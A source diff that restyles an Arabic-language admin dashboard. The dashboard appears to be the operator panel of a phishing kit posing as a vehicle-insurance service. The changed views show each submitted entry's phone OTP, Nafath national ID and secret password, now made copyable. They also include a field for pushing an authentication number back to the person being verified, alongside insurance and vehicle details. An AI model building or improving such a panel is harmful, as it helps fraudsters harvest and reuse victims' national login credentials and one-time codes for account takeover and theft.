-                                <p className="text-sm font-mono text-foreground">
-                                  {selectedApplication.phoneNumber2 || "—"}
-                                </p>
-                              </div>
-                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-primary/30 hover:bg-primary/5">
-                                <p className="text-xs text-muted-foreground mb-1">مزود الخدمة</p>
-                                <p className="text-sm font-medium text-foreground">
-                                  {selectedApplication.selectedCarrier || "—"}
-                                </p>
-                              </div>
+                            <div className="grid grid-cols-2 gap-3">
+                              <DataField label="الهاتف" value={selectedApplication.phoneNumber2} mono copyable />
+                              <DataField label="مزود الخدمة" value={selectedApplication.selectedCarrier} />
                             </div>
-                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
+                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-xl border border-border/50">
                               <div className="flex items-center justify-between mb-3">
                                 <div className="flex items-center gap-3">
-                                  <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
-                                    <Phone className="w-5 h-5 text-primary" />
+                                  <div className="w-10 h-10 rounded-xl bg-chart-4/10 flex items-center justify-center">
+                                    <Phone className="w-5 h-5 text-chart-4" />
                                   </div>
                                   <div>
                                     <p className="text-sm font-medium text-foreground">رمز الهاتف</p>
-                                    <p className="text-lg font-mono font-bold text-primary">
+                                    <p className="text-lg font-mono font-bold text-chart-4">
                                       {selectedApplication?.phoneOtp || "—"}
                                     </p>
                                   </div>
@@ -928,7 +1030,7 @@ export default function AdminDashboard() {
                                         ? "destructive"
                                         : "secondary"
                                   }
-                                  className="animate-in zoom-in duration-300"
+                                  className="rounded-md"
                                 >
                                   {selectedApplication.phoneVerificationStatus === "approved"
                                     ? "موافق"
@@ -943,20 +1045,20 @@ export default function AdminDashboard() {
                                 onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
                                 variant="outline"
                                 size="sm"
-                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
                                 disabled={selectedApplication.phoneVerificationStatus === "approved"}
                               >
-                                <CheckCircle className="w-4 h-4 mr-2" />
+                                <CheckCircle className="w-4 h-4 ml-2" />
                                 قبول
                               </Button>
                               <Button
                                 onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
                                 variant="outline"
                                 size="sm"
-                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl"
                                 disabled={selectedApplication.phoneVerificationStatus === "rejected"}
                               >
-                                <XCircle className="w-4 h-4 mr-2" />
+                                <XCircle className="w-4 h-4 ml-2" />
                                 رفض
                               </Button>
                             </div>
@@ -964,42 +1066,31 @@ export default function AdminDashboard() {
                         </div>
                       )}
 
-
                       {/* 4. Nafaz */}
                       {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
                         <div
-                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                           style={{ animationDelay: "300ms" }}
                         >
                           <div className="flex items-center gap-3 mb-4">
-                            <div className="p-2.5 rounded-lg bg-warning/10">
+                            <div className="p-2.5 rounded-xl bg-warning/10">
                               <User className="w-5 h-5 text-warning" />
                             </div>
                             <h3 className="font-semibold text-foreground">نفاذ الوطني</h3>
                           </div>
                           <div className="space-y-4">
-                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
+                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-xl border border-border/50">
                               <div className="space-y-3">
+                                <DataField label="الرقم الوطني" value={selectedApplication.nafazId} mono copyable />
+                                <DataField label="الرقم السري" value={selectedApplication.nafazPass} mono copyable />
                                 <div>
-                                  <p className="text-xs text-muted-foreground mb-1">الرقم الوطني</p>
-                                  <p className="text-sm font-mono font-medium text-foreground">
-                                    {selectedApplication.nafazId || "—"}
-                                  </p>
-                                </div>
-                                <div>
-                                  <p className="text-xs text-muted-foreground mb-1">الرقم السري</p>
-                                  <p className="text-sm font-mono font-medium text-foreground">
-                                    {selectedApplication.nafazPass || "—"}
-                                  </p>
-                                </div>
-                                <div>
-                                  <p className="text-xs text-muted-foreground mb-1">رمز التوثيق</p>
+                                  <p className="text-xs text-muted-foreground mb-1.5">رمز التوثيق</p>
                                   <Input
                                     type="tel"
                                     value={authNumber}
                                     onChange={(e) => setAuthNumber(e.target.value)}
                                     placeholder="أدخل رمز التوثيق"
-                                    className="h-9 text-sm"
+                                    className="h-10 text-sm rounded-xl"
                                   />
                                 </div>
                               </div>
@@ -1009,17 +1100,17 @@ export default function AdminDashboard() {
                                 onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
                                 variant="outline"
                                 size="sm"
-                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
                               >
-                                <CheckCircle className="w-4 h-4 mr-2" />
+                                <CheckCircle className="w-4 h-4 ml-2" />
                                 حفظ
                               </Button>
                               <Button
                                 variant="outline"
                                 size="sm"
-                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98] bg-transparent"
+                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl bg-transparent"
                               >
-                                <XCircle className="w-4 h-4 mr-2" />
+                                <XCircle className="w-4 h-4 ml-2" />
                                 إلغاء
                               </Button>
                             </div>
@@ -1030,48 +1121,20 @@ export default function AdminDashboard() {
                       {/* 5. Document Info */}
                       {hasDocumentInfo(selectedApplication) && (
                         <div
-                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                           style={{ animationDelay: "400ms" }}
                         >
                           <div className="flex items-center gap-3 mb-4">
-                            <div className="p-2 rounded-lg bg-primary/10">
-                              <FileText className="w-4 h-4 text-primary" />
+                            <div className="p-2.5 rounded-xl bg-primary/10">
+                              <FileText className="w-5 h-5 text-primary" />
                             </div>
                             <h3 className="font-semibold text-foreground">معلومات الوثيقة</h3>
                           </div>
                           <div className="space-y-3">
-                            {selectedApplication.documentType && (
-                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
-                                <span className="text-sm text-muted-foreground">نوع الوثيقة</span>
-                                <span className="text-sm font-medium text-foreground">
-                                  {selectedApplication.documentType}
-                                </span>
-                              </div>
-                            )}
-                            {selectedApplication.serialNumber && (
-                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
-                                <span className="text-sm text-muted-foreground">الرقم التسلسلي</span>
-                                <span className="text-sm font-mono text-foreground">
-                                  {selectedApplication.serialNumber}
-                                </span>
-                              </div>
-                            )}
-                            {selectedApplication.phoneNumber && (
-                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
-                                <span className="text-sm text-muted-foreground">رقم الهاتف</span>
-                                <span className="text-sm font-mono text-foreground" dir="ltr">
-                                  {selectedApplication.phoneNumber}
-                                </span>
-                              </div>
-                            )}
-                            {selectedApplication.country && (
-                              <div className="flex justify-between items-center py-2 transition-colors hover:bg-muted/30 px-2 rounded">
-                                <span className="text-sm text-muted-foreground">الدولة</span>
-                                <span className="text-sm font-medium text-foreground">
-                                  {selectedApplication.country}
-                                </span>
-                              </div>
-                            )}
+                            <DataField label="نوع الوثيقة" value={selectedApplication.documentType} />
+                            <DataField label="الرقم التسلسلي" value={selectedApplication.serialNumber} mono copyable />
+                            <DataField label="رقم الهاتف" value={selectedApplication.phoneNumber} mono copyable />
+                            <DataField label="الدولة" value={selectedApplication.country} />
                           </div>
                         </div>
                       )}
@@ -1079,40 +1142,22 @@ export default function AdminDashboard() {
                       {/* 6. Insurance Info */}
                       {hasInsuranceInfo(selectedApplication) && (
                         <div
-                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                           style={{ animationDelay: "500ms" }}
                         >
                           <div className="flex items-center gap-3 mb-4">
-                            <div className="p-2 rounded-lg bg-success/10">
-                              <Shield className="w-4 h-4 text-success" />
+                            <div className="p-2.5 rounded-xl bg-success/10">
+                              <Shield className="w-5 h-5 text-success" />
                             </div>
                             <h3 className="font-semibold text-foreground">تفاصيل التأمين</h3>
                           </div>
                           <div className="space-y-3">
-                            {selectedApplication.insuranceType && (
-                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
-                                <span className="text-sm text-muted-foreground">نوع التأمين</span>
-                                <span className="text-sm font-medium text-foreground">
-                                  {selectedApplication.insuranceType}
-                                </span>
-                              </div>
-                            )}
-                            {selectedApplication.insuranceStartDate && (
-                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
-                                <span className="text-sm text-muted-foreground">تاريخ البدء</span>
-                                <span className="text-sm font-medium text-foreground">
-                                  {selectedApplication.insuranceStartDate}
-                                </span>
-                              </div>
-                            )}
-                            {selectedApplication.repairLocation && (
-                              <div className="flex justify-between items-center py-2 transition-colors hover:bg-muted/30 px-2 rounded">
-                                <span className="text-sm text-muted-foreground">موقع الإصلاح</span>
-                                <span className="text-sm font-medium text-foreground">
-                                  {selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
-                                </span>
-                              </div>
-                            )}
+                            <DataField label="نوع التأمين" value={selectedApplication.insuranceType} />
+                            <DataField label="تاريخ البدء" value={selectedApplication.insuranceStartDate} />
+                            <DataField
+                              label="موقع الإصلاح"
+                              value={selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
+                            />
                           </div>
                         </div>
                       )}
@@ -1120,48 +1165,27 @@ export default function AdminDashboard() {
                       {/* 7. Vehicle Info */}
                       {hasVehicleInfo(selectedApplication) && (
                         <div
-                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                           style={{ animationDelay: "600ms" }}
                         >
                           <div className="flex items-center gap-3 mb-4">
-                            <div className="p-2 rounded-lg bg-chart-4/10">
-                              <Car className="w-4 h-4 text-chart-4" />
+                            <div className="p-2.5 rounded-xl bg-chart-4/10">
+                              <Car className="w-5 h-5 text-chart-4" />
                             </div>
                             <h3 className="font-semibold text-foreground">معلومات المركبة</h3>
                           </div>
-                          <div className="grid grid-cols-2 gap-4">
-                            {selectedApplication.vehicleModel && (
-                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
-                                <p className="text-xs text-muted-foreground mb-1">الموديل</p>
-                                <p className="text-sm font-medium text-foreground">
-                                  {selectedApplication.vehicleModel}
-                                </p>
-                              </div>
-                            )}
-                            {selectedApplication.manufacturingYear && (
-                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
-                                <p className="text-xs text-muted-foreground mb-1">سنة الصنع</p>
-                                <p className="text-sm font-medium text-foreground">
-                                  {selectedApplication.manufacturingYear}
-                                </p>
-                              </div>
-                            )}
-                            {selectedApplication.vehicleValue && (
-                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
-                                <p className="text-xs text-muted-foreground mb-1">القيمة</p>
-                                <p className="text-sm font-medium text-foreground">
-                                  {selectedApplication.vehicleValue} ريال
-                                </p>
-                              </div>
-                            )}
-                            {selectedApplication.vehicleUsage && (
-                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
-                                <p className="text-xs text-muted-foreground mb-1">الاستخدام</p>
-                                <p className="text-sm font-medium text-foreground">
-                                  {selectedApplication.vehicleUsage}
-                                </p>
-                              </div>
-                            )}
+                          <div className="grid grid-cols-2 gap-3">
+                            <DataField label="الموديل" value={selectedApplication.vehicleModel} />
+                            <DataField label="سنة الصنع" value={selectedApplication.manufacturingYear} />
+                            <DataField
+                              label="القيمة"
+                              value={
+                                selectedApplication.vehicleValue
+                                  ? `${selectedApplication.vehicleValue} ريال`
+                                  : undefined
+                              }
+                            />
+                            <DataField label="الاستخدام" value={selectedApplication.vehicleUsage} />
                           </div>
                         </div>
                       )}
@@ -1170,10 +1194,10 @@ export default function AdminDashboard() {
                     /* Empty state when no grid data exists */
                     <div className="flex items-center justify-center h-full">
                       <div className="text-center animate-in fade-in zoom-in duration-500">
-                        <div className="w-20 h-20 rounded-2xl bg-muted/50 flex items-center justify-center mx-auto mb-4">
-                          <FileText className="w-10 h-10 text-muted-foreground" />
+                        <div className="w-24 h-24 rounded-3xl bg-muted/50 flex items-center justify-center mx-auto mb-5">
+                          <FileText className="w-12 h-12 text-muted-foreground" />
                         </div>
-                        <h3 className="text-lg font-semibold text-foreground mb-2">لا توجد بيانات</h3>
+                        <h3 className="text-xl font-bold text-foreground mb-2">لا توجد بيانات</h3>
                         <p className="text-sm text-muted-foreground">لم يتم إضافة أي معلومات لهذا الطلب بعد</p>
                       </div>
                     </div>
@@ -1184,10 +1208,10 @@ export default function AdminDashboard() {
           ) : (
             <div className="flex items-center justify-center h-full">
               <div className="text-center animate-in fade-in zoom-in duration-500">
-                <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
-                  <Mail className="w-10 h-10 text-muted-foreground" />
+                <div className="w-24 h-24 rounded-3xl bg-muted flex items-center justify-center mx-auto mb-5">
+                  <Mail className="w-12 h-12 text-muted-foreground" />
                 </div>
-                <h3 className="text-lg font-semibold text-foreground mb-2">اختر طلباً لعرض التفاصيل</h3>
+                <h3 className="text-xl font-bold text-foreground mb-2">اختر طلباً لعرض التفاصيل</h3>
                 <p className="text-sm text-muted-foreground">اضغط على أي طلب من القائمة الجانبية</p>
               </div>
             </div>
